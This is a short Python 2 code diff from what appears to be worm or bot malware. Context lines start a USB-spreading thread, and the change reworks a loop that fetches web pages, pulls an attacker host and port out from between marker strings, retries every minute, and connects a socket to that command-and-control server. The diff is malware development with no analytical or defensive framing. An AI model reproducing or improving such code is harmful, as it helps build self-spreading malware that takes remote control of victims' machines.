@@ -111,17 +111,23 @@ class UsbSpread(threading.Thread):
 usbSpreader = UsbSpread()
 usbSpreader.start()
 
-while 1:
-    try:
+
+def get_connection_creds():
+    while 1:
         for url in url_list:
             try:
                 req = urllib.urlopen(url).read()
                 start = req.index('#!#!#!') + 6; end = req.index('#?#?#?')
                 HOST, PORT = req[start:end].split(':')
-                print HOST, PORT
-                break
+                return HOST, PORT
             except:
                 continue
+        time.sleep(60)
+
+
+while 1:
+    try:
+        HOST, PORT = get_connection_creds()
         GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         GLOBAL_SOCKET.connect((HOST, int(PORT)))
         GLOBAL_SOCKET.recv(1024)
